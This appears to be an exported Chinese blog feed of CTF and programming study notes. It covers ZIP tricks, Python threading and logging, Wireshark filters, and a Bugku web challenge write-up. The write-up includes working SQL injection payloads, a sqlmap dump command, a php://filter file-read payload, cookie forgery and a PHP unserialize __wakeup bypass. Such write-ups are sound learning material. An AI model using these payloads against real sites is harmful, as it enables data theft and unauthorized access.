    <content type="text"><![CDATA[一个ZIP文件由三个部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 压缩源文件数据区： 50 4B 03 04 即头文件标记压缩源文件目录区： 50 4B 01 02：目录中文件头标记 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（更改这里进行伪加密，09 00为伪加密，改为00 00就没加密了）压缩源文件目录结束标志： 50 4B 05 06 即目录结束标记 这道题将09 00改为00 00即可直接解压]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[找不同-图片盲水印]]></title>
    <url>%2F2019%2F02%2F02%2F%E6%89%BE%E4%B8%8D%E5%90%8C-%E7%9B%B2%E6%B0%B4%E5%8D%B0%2F</url>
    <content type="text"><![CDATA[原理什么的有点迷，一般ctf的题目给出了两张图片让找不同就是考察图片盲水印 解水印准备工作Github地址 使用bwm的环境是python2，但我一直使用的都是python3的版本，上网找尽各种方法，还是老老实实用python2吧 安装Python2的pip由于之前存在python3的pip，因此也有些费力的装了个Python2的pip 原地址 安装时报错： 编码问题，找到出问题的setup.py文件，在import下方加入： if sys.getdefaultencoding() != &apos;gbk&apos;: reload(sys) sys.setdefaultencoding(&apos;gbk&apos;)安装好了pip，由于环境变量中的python3优先级大于python2，因此输入pip显示的是python3的pip 将python27文件夹中的python.exe改为python2.exe，这样输入python是python3，输入python2则是python2 找到资料，输入 python2 -m pip --version即可显示python2中的pip信息 至此python2的pip安装完毕 安装运行脚本所需要的包安装opencv库： python2 -m pip install opencv-python安装matplotlib库 python2 -m pip install matplotlibbwm的使用cd到bwm.py目录， 合成： python2 bwm.py encode 原图名称 水印图名称 合成图名称提取： python2 bwm.py decode 原图名称 加了水印图后的名称 水印图名称数字盲水印与图片盲水印这两种水印添加后基本未对原始图像造成视觉上的损失 数字盲水印就是将一些数字或字母信息隐藏到图片中；图片盲水印就是将一张图片隐藏到另一张图片中，解水印的时候需要原图与加了水印后的图才能解出水印 大佬写的有关盲水印的文章： https://www.zhihu.com/question/50735753/answer/122593277]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ZIP明文攻击]]></title>
    <url>%2F2019%2F02%2F01%2FZIP%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[有一个待解压的ZIP文件，不知道密码，但已有这个加密文件中的一个文件，则将这个已知文件加密为ZIP格式，进行hex对比即可得出ZIP加密的三个key 有两个文件，将这两个文件打包成ZIP格式，密码设置为1234；使用WinRAR，在设置密码时选择传统加密 现在打开这个压缩包，有两个文件，不知道解压密码 但如果得到了其中的一个文件touxiang.png，那么就可以使用明文攻击获得密码： 1.将touxiang.png进行ZIP压缩 2.使用Advanced Archive Password Recovery这个工具 得到这个文件的口令，即解压密码 直接点击这个按钮，即可将文件转换成无密码的压缩文件，可直接解压]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python多线程与多进程学习]]></title>
    <url>%2F2019%2F01%2F31%2Fpython%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[学习多线程 多进程与多线程程序：将一些代码放到文档中 进程： 程序运行的一个状态；每个进程有自己完全独立的运行环境，不共享数据比如双击QQ，输入一个账号密码登录后，再次双击QQ，可以登录另一个QQ账号；这样就有了两个进程，彼此独立，不共享数据 线程： 一个进程的独立运行片段，一个进程可以由多个线程组成； 一个进程的多个线程共享数据和上下文运行环境threading包基本使用import threading t = threading.Thread(target=xxx, args=(xxx,)) #生成Thread实例 #target为函数名，args为传入函数的参数：若无参数，可省略args，若有一个参数，要在参数后加上逗号 t.start() #启动多线程 t.join() #等待多线程执行完成 #启动多线程后本程序就作为主线程存在，如果主线程执行完毕，则子线程可能也会终止1234567891011121314151617181920212223242526import timeimport threadingdef loop1(): print('loop1开始运行\n') time.sleep(4) print('loop1运行完毕\n')def loop2(): print('loop2开始运行\n') time.sleep(2) print('loop2运行完毕\n')def main(): print('主程序开始运行\n') t1 = threading.Thread(target=loop1, args=()) t1.start() t2 = threading.Thread(target=loop2, args=()) t2.start() print('主程序运行完毕\n') if __name__ == '__main__': main() 运行结果： 主程序开始运行 loop1开始运行 loop2开始运行 主程序运行完毕 loop2运行完毕 loop1运行完毕可以看到，主线程运行完毕后子线程才运行完毕，而且由于子线程t2睡眠2s比子线程t1睡眠4s短而先运行完毕 等待线程使用t.join()，让主线程等待子线程运行： 12345678910111213141516171819202122232425262728import timeimport threadingdef loop1(): print('loop1开始运行\n') time.sleep(4) print('loop1运行完毕\n')def loop2(): print('loop2开始运行\n') time.sleep(2) print('loop2运行完毕\n')def main(): print('主程序开始运行\n') t1 = threading.Thread(target=loop1, args=()) t1.start() t2 = threading.Thread(target=loop2, args=()) t2.start() t1.join() t2.join() print('主程序运行完毕\n') if __name__ == '__main__': main() 运行结果： 主程序开始运行 loop1开始运行 loop2开始运行 loop2运行完毕 loop1运行完毕 主程序运行完毕守护线程如果想让主线程运行完毕后，子线程就停止运行，那么可以将子线程设置为守护线程 方法：在子线程start()前， t.setDeamon(True)守护线程能否有效与运行环境有关，在jupyter运行发现守护线程设置失效，而pycharm设置成功了 1234567891011121314151617181920212223242526272829303132import timeimport threadingdef loop1(): print('loop1开始运行\n') time.sleep(4) print('loop1运行完毕\n')def loop2(): print('loop2开始运行\n') time.sleep(2) print('loop2运行完毕\n')def main(): print('主程序开始运行\n') t1 = threading.Thread(target=loop1, args=()) t1.setDaemon(True) t1.start() t2 = threading.Thread(target=loop2, args=()) t2.setDaemon(True) t2.start() print('主程序运行完毕\n')if __name__ == '__main__': main() 输出结果： 主程序开始运行 loop1开始运行 loop2开始运行 主程序运行完毕常用属性threading.currentThread:返回当前线程变量 threading.enuerate: 返回一个包含正在运行的线程的list threading.activeCount: 返回正在运行的线程的数量 t1.setName(): 给线程命名 t1.getName(): 得到线程名称直接继承threading.Thread使用类的实例来启动多线程 12345678910111213141516171819import threadingclass Th(threading.Thread): def __init__(self, arg): super(Th, self).__init__() self.arg = arg # 必须重写run函数，代表真正执行的功能 def run(self): print(self.arg)for i in range(5): t = Th(i) t.start() t.join()print('over') 事件Event()可以使主进程控制其他线程的执行 Event()全局定义了一个标志flag；若flag为True，则当前线程执行Event.wait()方法时会阻塞，其他线程会等待；若flag为False，则不再阻塞 Event()的方法： set():设置标记为True clear():设置标记为False wait():若标志为True则进行阻塞，标志为False则不进行阻塞 isSet():返回flag状态 使用类来进行线程的暂停、继续和终止操作： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import threadingimport timeclass Job(threading.Thread): def __init__(self): super(Job, self).__init__() self.__flag = threading.Event() # 用于暂停线程的标识 self.__flag.set() # 设置为True self.__running = threading.Event() # 用于停止线程的标识 self.__running.set() # 将running设置为True def run(self): while self.__running.isSet(): self.__flag.wait() # 为True时立即返回, 为False时阻塞直到内部的标识位为True后返回 print(time.time()) time.sleep(1) def pause(self): print('pause') self.__flag.clear() # 设置为False, 让线程阻塞 def resume(self): print('resume') self.__flag.set() # 设置为True, 让线程停止阻塞 def stop(self): print('stop') self.__flag.set() # 将线程从暂停状态恢复, 如已经暂停的话 self.__running.clear() # 设置为Falsea = Job()a.start()time.sleep(3)a.pause()time.sleep(3)a.resume()time.sleep(3)a.pause()time.sleep(2)a.stop() 参考： https://fishc.com.cn/thread-104073-1-7.html https://www.cnblogs.com/yoyoketang/p/8341972.html共享变量当多个线程同时访问一个变量的时候，会产生共享变量的问题 1234567891011121314151617181920212223242526import threadingsums = 0def Add(): global sums for i in range(1,1000000): sums += 1def Minus(): global sums for i in range(1,1000000): sums -= 1 if __name__ == '__main__': t1 = threading.Thread(target=Add,args=()) t2 = threading.Thread(target=Minus,args=()) t1.start() t2.start() t1.join() t2.join() print(sums) 结果：输出随机的数，正数或负数 解决方法：锁(锁互斥的资源) 1.是一个标志，表示一个线程在占用一些资源 2.使用时要上锁，用完后还要释放锁使用锁保证了在同一时间只有一个线程在真正访问这个变量 定义锁： lock = threading.Lock()申请锁： lock.aquire()释放锁： lock.release()使用锁之后： 12345678910111213141516171819202122232425262728293031import threadingsums = 0lock = threading.Lock()def Add(): global sums for i in range(1,1000000): lock.acquire() sums += 1 lock.release()def Minus(): global sums for i in range(1,1000000): lock.acquire() sums -= 1 lock.release() if __name__ == '__main__': t1 = threading.Thread(target=Add,args=()) t2 = threading.Thread(target=Minus,args=()) t1.start() t2.start() t1.join() t2.join() print(sums) 输出结果： 0使用锁的时候应注意防止死锁情况 timeout参数lock1 = threading.Lock() lock1.acquire(timeout=2) #如果锁空闲，则立即申请到，否则最多等待2s lock2 = threading.Lock() rst = lock2.acquire(timeout=2) #若在2s内申请成功，返回true，否则false线程数量semaphore：允许一个资源最多可以让几个线程同时使用 123456789101112import threadingsemaphore = threading.Semaphore(3) #最多允许三个线程同时使用def func(): if semaphore.acquire(): print(threading.CurrentThread().getName()) semaphore.release() print(threading.CurrentThread().getName())for i in range(5): t = threading.Thread(target=func) t.start() 设置线程启动时间设置6s之后启动线程： def func(): print(&apos;xxx&apos;) t = threading.Timer(6, func) t.start()multiprocessing包基本使用multiprocessing模块提供了一个Process类来代表一个进程对象 getpid():获得当前进程的编号。系统每开辟一个新进程就会为它分配一个进程号 12345678910111213141516import multiprocessingimport os# 子进程要执行的代码def run_proc(name): print('Run child process %s (%s)...' % (name, os.getpid()))if __name__ == '__main__': print('Parent process %s.' % os.getpid()) p = multiprocessing.Process(target=run_proc, args=('test',)) print('Child process will start.') p.start() p.join() # 等待子进程 print('Child process end.') 进程池启动大量的子进程： 1234567import multiprocessingp = multiprocessing.Pool(4)p.apply_async(target=func,args=())p.close()p.join()# apply_async :不用等待当前进程执行完毕，随时根据系统调度来进行进程切换。 首先主进程开始运行，碰到子进程后，主进程仍可以先运行，等到操作系统进行进程切换的时候，再交给子进程运行。可以做到不等待子进程执行完毕，主进程就已经执行完毕，并退出程序。 同线程池一样，对Pool对象调用join()方法会等待所有子进程执行完毕，调用join()之前必须先调用close()，调用close()之后就不能继续添加新的Process了。 Pool的默认大小是CPU的核数 12345678910111213141516171819from multiprocessing import Poolimport os, time, randomdef long_time_task(name): print('Run task %s (%s)...' % (name, os.getpid())) time.sleep(1) print('Task %s runs over' % name)if __name__ == '__main__': print('Parent process %s.' % os.getpid()) p = Pool(2) for i in range(5): p.apply_async(long_time_task, args=(i,)) print('Waiting...') p.close() p.join() print('done.') 电脑cpu核数不同，输出也不同 线程池使用的multiprocessing包与进程使用的模块一样，但 from multiprocessing import Pool 这样导入的Pool表示的是进程池； from multiprocessing.dummy import Pool 这样导入的Pool表示的是线程池。创建线程池： ThreadPool(10) # 创建10个容量的线程池并发执行map()是 Python 内置的高阶函数，它接收一个函数 f 和一个 list，并通过把函数 f 依次作用在 list 的每个元素上，得到一个新的 list 并返回。 同样，在使用线程池并发时，用到函数与多个参数，因此也用到了map： pool.map(func, list) #func为函数名，list为参数列表在使用 pool.join()等待之前，应先调用 pool.close() 例子-python多线程MD5截断脚本 123456789101112131415161718192021import hashlibfrom multiprocessing.dummy import Pooldef md5(t): lists = t.split(':') t1 = int(lists[0]) t2 = int(lists[1]) for i in range(t1, t2): if hashlib.md5(str(i).encode('utf-8')).hexdigest()[:6] == '75fc82': print(i) breakif __name__ == '__main__': pool = Pool(5) lists = ['1:100000', '100000:200000', '200000:300000', '300000:400000', '400000:500000'] pool.map(md5, lists) pool.close() pool.join() print('over')]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python LOG学习]]></title>
    <url>%2F2019%2F01%2F30%2Fpython-LOG%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[日志可以记录程序运行时所发生的事件，也可以通过分析日志快速定位问题 python中的logging模块可以实现对日志的操作 更新写在前面 学了一些关于python logging的使用，就产生了疑问：为什么不直接用print语句输出信息呢？ 后来了解到，使用print的方法对于简单的脚本型程序可用，但是复杂的系统最好别用这种方式，不然可能忘了移除这些print，或者print影响从标准输出中查看其它数据… 123456789101112import logginglogging.basicConfig(filename='C:/Users/腾飞/Desktop/string.txt',level=logging.DEBUG)a = 'hello'logging.debug('创建了字符串a: %s'%a)b = 'world'logging.debug('创建了字符串b: %s',b) #两种写法均可c = a + blogging.debug('字符串a与b相加，得到c:%s',c)try: d = a - bexcept: logging.error('字符串a与b不能相减') LOG基本方法logging模块的日志等级(从低到高)： DEBUG ： 最详细的日志信息 INFO ： 只记录关键节点信息 WARNING ： 当某些不期望的事情发生时记录的信息 ERROR ： 由于一个更严重的问题导致某些功能不能正常运行时记录的信息 CRITICAL ： 发生严重错误，程序不能继续运行时记录的信息12345678910111213141516import logginglogging.debug("This is a debug log.")logging.info("This is a info log.")logging.warning("This is a warning log.")logging.error("This is a error log.")logging.critical("This is a critical log.")#或'''logging.log(logging.DEBUG, "This is a debug log.")logging.log(logging.INFO, "This is a info log.")logging.log(logging.WARNING, "This is a warning log.")logging.log(logging.ERROR, "This is a error log.")logging.log(logging.CRITICAL, "This is a critical log.")''' 输出： WARNING:root:This is a warning log. ERROR:root:This is a error log. CRITICAL:root:This is a critical log.logging模块提供的日志记录函数所使用的日志器设置的日志级别是WARNING，因此只有WARNING级别的日志记录以及大于它的ERROR和CRITICAL级别的日志记录才会被输出 logging模块也可以指定日志记录器的日志级别，只有级别大于或等于该指定日志级别的日志记录才会被输出，小于该等级的日志记录将会被丢弃。 LOG配置logging.basicConfig()为logging日志系统做一些基本配置 level指定日志器的日志级别 123456789import logginglogging.basicConfig(level=logging.DEBUG)logging.debug("This is a debug log.")logging.info("This is a info log.")logging.warning("This is a warning log.")logging.error("This is a error log.")logging.critical("This is a critical log.") 输出： DEBUG:root:This is a debug log. INFO:root:This is a info log. WARNING:root:This is a warning log. ERROR:root:This is a error log. CRITICAL:root:This is a critical log.filename指定日志输出目标文件的文件名，指定该设置项后日志就不会被输出到控制台了 123456789import logginglogging.basicConfig(filename='log.txt', level=logging.DEBUG)logging.debug("This is a debug log.")logging.info("This is a info log.")logging.warning("This is a warning log.")logging.error("This is a error log.")logging.critical("This is a critical log.") 可以在当前py文件目录下找到log.txt这个文件，再次运行程序，会发现信息被追加到上次记录的日志后面，因为默认是以追加方式’a’打开的文件 可以使用filemode 指定日志文件的打开模式，默认为’a’。需要注意的是，该选项要在filename指定时才有效 format指定日志格式字符串，即指定日志输出时所包含的字段信息以及它们的顺序。 常用format格式字符串的字段： 123456789101112131415import logging#设置字段格式LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"#设置日期格式DATE_FORMAT = "%m/%d/%Y %H:%M:%S %p"logging.basicConfig(filename='my.log', level=logging.DEBUG, format=LOG_FORMAT, datefmt=DATE_FORMAT)logging.debug("This is a debug log.")logging.info("This is a info log.")logging.warning("This is a warning log.")logging.error("This is a error log.")logging.critical("This is a critical log.") 捕捉异常使用参数 exc_info=true，会输出traceback 123456789101112import logginglogging.basicConfig(filename='C:/Users/腾飞/Desktop/string.txt',level=logging.DEBUG)a = 'hello'logging.debug('创建了字符串a: %s'%a)b = 'world'logging.debug('创建了字符串b: %s',b)c = a + blogging.debug('字符串a与b相加，得到c:%s',c)try: d = a - bexcept Exception as e: logging.error('a与b不能相减',exc_info=True)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python实现16进制字符串转ASCII字符]]></title>
    <url>%2F2019%2F01%2F30%2Fpython%E5%AE%9E%E7%8E%B016%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%ACASCII%E5%AD%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[一行代码实现： a = &apos;&apos; &apos;&apos;.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]]) 分析 1.其中： [a[i:i+2] for i in range(0, len(a), 2)]意思就是从0开始到a长度的字符串，步长为2进行遍历，然后a[i:i+2]取前两个字符；这句话意思相当于将一个字符串分成两个字符为一组，再放到列表中 2. [chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]]int(b,16)表示b为16进制的数，转化为10进制的数，例如： 12print(int('f',16))#输出15 即将每个16进制的数转化为10进制，然后再用chr()将10进制转化为ASCII字符 3. &apos;&apos;.join将转换后的字符进行拼接，例如： 12345a = ['a','b','c','d']a = ''.join(a)print(a)#输出abcd]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python中的编码模块]]></title>
    <url>%2F2019%2F01%2F29%2Fpython%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[学习一下如何写解码脚本 basePython内置的base64模块可以实现base64、base32、base16、base85、base-urlsafe加解密 b64encode的参数s的类型必须是字节流（bytes）。b64decode的参数s可以是字节包（bytes），也可以是字符串（str）。 base641234flag = base64.b64encode(b'flag')print(flag)flag = base64.b64decode(flag)print(flag) 输出 b&apos;ZmxhZw==&apos; b&apos;flag&apos;可以进行解码得到str数据： 1234flag = base64.b64encode(b'flag').decode('utf-8')print(flag)flag = base64.b64decode(flag).decode('utf-8')print(flag) 输出 ZmxhZw== flagbase8512345import base64flag = base64.b85encode(b'hello').decode('utf-8') print(flag)flag = base64.b85decode(flag).decode('utf-8')print(flag) 输出 Xk~0{Zv hellourlsafeBase64 默认会使用+和/, 但是这 2 个字符在 url 中也有特殊含义。使用 urlsafe 可以解决这个问题。 +替换为-, /替换为_。 编码解码方式： base64.urlsafe_b64encode() base64.urlsafe_b64decode()hash在hashlib库的hash算法中，提供了很多加密算法，有 sha1()、sha224()、sha256()、sha384()、sha512()、blake2b()和 blake2s()、md5() md5Python2.x中有md5模块，此模块调用了hashlib模块，python3.x已中将md5取掉，直接通过调用hashlib模块来进行md5。Python2.x可以直接使用unicode字符，但3.x中必须使用二进制字节串。 12345import hashlibm = hashlib.md5()m.update(b'hello') #更新hash对象，重复调用则进行拼接print(m.hexdigest()) 输出： 5d41402abc4b2a76b9719d911017c592也可使用 123m = hashlib.new('md5') #加密算法名称m.update(b'hello')m.hexdigest() sha112345678910111213import hashlibm = hashlib.sha1()m.update(b'hell')m.update(b'o')print(m.hexdigest())#或'''m = hashlib.new('sha1')m.update(b'hello')m.hexdigest()''' 输出 aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434dcrc321234567891011import zlibs = zlib.crc32(b'hello, world!')print(s)#或'''import binasciis = binascii.crc32(b'hello, world!')print(s)''' 输出 1486392595]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[计算机内存与硬盘]]></title>
    <url>%2F2019%2F01%2F29%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E5%AD%98%E4%B8%8E%E7%A1%AC%E7%9B%98%2F</url>
    <content type="text"><![CDATA[看到一篇讲内存的文章，学习学习 当运行一个软件时，操作系统会在硬盘中找到安装的软件，将数据复制到内存，因为对于读写速度， 内存&gt;固态硬盘&gt;机械硬盘机械硬盘时靠电机带动盘片转动来读写数据；内存条通过电路来读写数据；固态硬盘也是通过电路来读写数据，但与内存的控制方式不一样，速度不及内存 因此当运行程序时，先将硬盘上的数据复制到内存，才能让CPU处理，这个过程叫做载入内存；CPU直接与内存打交道，它会读取内存中的数据进行处理，并将结果保存到内存。如果需要保存到硬盘，才会将内存中的数据复制到硬盘 打开word输入文字，新增的文字会暂时保存到了内存，Ctrl+S后才会保存到硬盘。因为内存断电后会丢失数据，因此忘了保存就关机，那么数据就会丢失 原文：载入内存，让程序运行起来]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Wireshark-流量分析学习]]></title>
    <url>%2F2019%2F01%2F24%2FWireshark-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[学习流量分析 数据包文件后缀当保存抓取到的数据包时，默认后缀为pcapng，还可以选择改为pcap等后缀： 主页面信息 显示调整增加列如，将TTL添加为列：找到一个TTL，右键-应用为列： 添加之后： 修改列名称如，修改Time to live为TTL，则右键Time to live-编辑列： 在标题输入TTL，点击ok即可： 删除列鼠标移动到列名-右键-删除 时间格式设置 数据包操作标记/取消标记数据包鼠标移动到数据包-右键-标记 添加数据包注释鼠标移动到数据包-右键-分组注释 之后点击该数据包即可看到注释： 显示过滤器过滤IP： ip.addr == 192.168.1.2 ip.src == ip.dst == 过滤端口： tcp.port == 80 tcp.srcport == tcp.dstport == tcp.flag.syn == 1过滤协议： arp tcp udp not http 比较操作符： != 不等于 == 等于 &lt; &gt; &gt;= &lt;=逻辑操作符： and or xor 有且仅有一个条件被满足 not 没有条件满足包含： http contains &quot;abc.txt&quot;高级功能数据流追踪可以将TCP、UDP、SSL等数据流进行重组并完整呈现出来]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[newBugku wp]]></title>
    <url>%2F2019%2F01%2F20%2FnewBugku-wp%2F</url>
    <content type="text"><![CDATA[题目出的很有意思，啊！好菜啊！ web1 extract变量覆盖，构造： ?a即可 web2 手速问题，脚本： 12345678910111213import requestsurl = 'http://123.206.31.85:10002/'s = requests.session()req = s.get(url).texta = req.find('哦')b = req.find('&lt;/p&gt;')exp = req[a+7:b]sum = eval(exp)print(sum)data = &#123;'result':'%d'%sum&#125;final = s.post(url,data)print(final.text) web3 上传了文件，但是不知道要怎么做 注意到op=upload，使用php伪协议 op=php://filter/read=convert.base64-encode/resource=flag将得到的base64解码 web4 使用or &apos;or 1=1# asdfweb5sql注入题，直接用sqlmap跑出来 python2 sqlmap.py -u &quot;http://47.95.208.167:10005/?mod=read&amp;id=2&quot; --dump 或者直接构造整型的payload id=0 union select 1,2,flag,3 from flagweb6 查看源代码，在最下面发现 进行base64解码后，是test123 进行登录，由于是管理员系统，尝试用户名为admin，密码为test123 但点击登录后，提示： 则进行抓包，添加XFF头： web7 抓包 若直接Go，会返回： Set-Cookie: u=351e76680321232f297a57a5a743894a0e4a801fc3 Set-Cookie: r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff Welcome limited user! 你的权限不够!将admin进行md5加密，为： 21232f297a57a5a743894a0e4a801fc3则将r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff改为 r=351e76680321232f297a57a5a743894a0e4a801fc3再次GO，成功返回flag web8 由于年龄的输入框限制了只能输数字，则需要更改一下页面源代码 输入 1^1，点击更新资料后 则年龄处存在整型注入 1.获取当前数据库名 hex(database())更新后显示 77656238转换成字符后为 web82.获取表名 hex(select group_concat(table_name) from information_schema.tables where table_schema=database())显示更新错误，后来才知道要在外面再加一层括号 hex((select group_concat(table_name) from information_schema.tables where table_schema=database()))更新后显示 7573657273转换成字符后为 users3.获取表字段名 hex((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273))更新后显示 数据太大，没有在输入框显示，在下方源代码中，转换成字符后为 id,username,password,nickname,age,description4.获取数据 使用 hex((select description from users where username=0x61646D696E limit 0,1))这句话显示错误。。。想不明白 看到交流群有大佬发的语句,改成 hex((select description from (select * from users where username=0x61646D696E limit 0,1) as b))得到flag，不过最后一步还是不懂为什么要这样构造。。。 web9 用脚本，put提交内容bugku 12345import requestsurl = 'http://123.206.31.85:3031/'req = s.put(url,data='bugku')print(req.text) 之后进行base64解密 web11 查看源代码，在head标签发现提示 进入robots.txt User-agent: * Disallow: /shell.php则进入shell.php去看看 是个md5截断的问题，在网上搜到的一个脚本： 1234567891011121314151617181920212223242526272829303132import hashlibfrom multiprocessing.dummy import Pool as ThreadPooldef md5(s): # 计算MD5字符串 return hashlib.md5(str(s).encode('utf-8')).hexdigest()keymd5 = input('请输入截断后的md5值') #已知的md5截断值md5start = 0 # 设置题目已知的截断位置md5length = 6def findmd5(sss): # 输入范围 里面会进行md5测试 key = sss.split(':') start = int(key[0]) # 开始位置 end = int(key[1]) # 结束位置 result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:6] == keymd5: # 拿到加密字符串 result = i print(result) # 打印 breaklist=[] # 参数列表for i in range(10): # 多线程的数字列表 开始与结尾 list.append(str(10000000*i) + ':' + str(10000000*(i+1)))pool = ThreadPool() # 多线程任务pool.map(findmd5, list) # 函数 与参数列表pool.close()pool.join() web12查看页面源代码 class Time{ public $flag = ******************; public $truepassword = ******************; public $time; public $password ; public function __construct($tt, $pp) { $this-&gt;time = $tt; $this-&gt;password = $pp; } function __destruct(){ if(!empty($this-&gt;password)) { if(strcmp($this-&gt;password,$this-&gt;truepassword)==0){ echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;; if(!empty($this-&gt;time)){ if(!is_numeric($this-&gt;time)){ echo &apos;Sorry.&lt;br&gt;&apos;; show_source(__FILE__); } else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66){ echo &apos;you need a bigger time.&lt;br&gt;&apos;; } else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11){ echo &apos;you need a smaller time.&lt;br&gt;&apos;; } else{ sleep((int)$this-&gt;time); var_dump($this-&gt;flag); } echo &apos;&lt;hr&gt;&apos;; } else{ echo &apos;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&apos;; } } else{ echo &apos;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&apos;; } } else{ echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;; } } function __wakeup(){ $this-&gt;password = 1; echo &apos;hello hacker,I have changed your password and time, rua!&apos;; } } if(isset($_GET[&apos;rua&apos;])){ $rua = $_GET[&apos;rua&apos;]; @unserialize($rua); } else{ echo &quot;&lt;h1&gt;Please don&apos;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;; }代码由Time类，一个if else语句构成，要传入rua这个参数，然后进行反序列化 Time类中的password的值要和设好的turepassword的值进行比较，要相等，由于用到了strcmp，则使用数组即可绕过；time的值不能大于也不能小于66 * 55 * 44 * 33 * 23 * 11，因此相等即可，但有个sleep函数，因此使用16进制绕过(或科学计数法) 如何序列化 变量类型：类名长度：类名：属性数量：{属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容}PHP 有个 Bug，该漏洞可以概括为： 当序列化字符串中表示对象的属性的个数大于真实的属性个数时会跳过 __wakeup 函数的执行构造： ?rua=O:4:&quot;Time&quot;:4:{s:4:&quot;time&quot;;s:10:&quot;0x4c06f350&quot;;s:8:&quot;password&quot;;a:1:{i:0;i:1;}}本来只需构造两个属性，改为四个，则利用了这个bug，即可绕过__wakeup() 感谢大佬的文章： https://blog.csdn.net/weixin_42348709/article/details/84895343web13 这道题比较坑的地方是得到的flag要将括号去掉然后提交 脚本： 123456789101112131415import requestsimport base64s = requests.session()url = 'http://123.206.31.85:10013/index.php'req = s.get(url)flag = req.headers['Password']flag = base64.b64decode(flag).decode('utf-8') flag = flag[5:-1]data = &#123;'password':'%s'%flag&#125;print(data)res = s.post(url,data)print(res.text)print(res.headers) web14听说备份了不少东西呢 git源码泄露，使用GitHack扫描 web18Sql injection 这道题为get 字符型注入，把井号#过滤了，不过没想到用 --+这个注释符-_- 1.获取表名 ?id=0&apos;ununionion seleselectc 1,2，group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+得到 ctf,flag2.获取字段名 ?id=0&apos;ununionion seleselectct 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag&apos;--+得到 id,flag3.获取flag ?id=0&apos; ununionion seleselectct 1,2,flag from flag--+web24扫描一波，发现有/index目录，进去后是代码审计，构造出反序列化即可 不过这里有点坑，它先进行了一次解密，也就是构造私有属性的反序列化时，不能用%xx的形式来做了，python脚本： 12345678a = '0x00'a = chr(int(a, 16))payload = 'O:18:"Small_white_rabbit":3:&#123;s:24:"' + a + 'Small_white_rabbit' + a + 'file";s:12:"the_f1ag.php";&#125;'import base64var = base64.b64encode(payload.encode('utf-8'))print(var) 二维码打开txt文件，发现是data URI scheme，复制到浏览器，得到解压密码 解压文件，得到160张二维码，使用微微二维码扫码工具批量扫描(还可以根据文件大小来得到信息) 不过得到的信息在Excel文件中。。 左边是文件名，右边是对应的解码信息，发现都是1和0，按照文件名顺序进行排序，之后删除第一列，再用脚本提取出来： 12345678910f = open('C:\\Users\\腾飞\\Desktop\\a\\a.csv')a = f.readlines()b = []for i in a: i = i.replace('\n','') b.append(i)s = ''for i in b: s+=iprint(s) 得到的为： 0110011001101100011000010110011101111011010100010101001001100011011011110110010001100101001100010111001101010101011100110110010101100110011101010110110001111101之后进行8位一组转ascii 日志审计从日志中找出黑客攻击的痕迹 下载下来，打开后有很多记录： 搜索‘flag’这个关键字，出现了一些记录： 发现这些记录经过了url编码，进行解码： 发现这些记录是进行SQL注入时使用的，则将这些注入用到的ascii的对应的十进制的值转换为ascii，用脚本提取： 123456789101112131415161718192021222324252627282930313233data = '''192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),1,1))=102-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),2,1))=108-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip 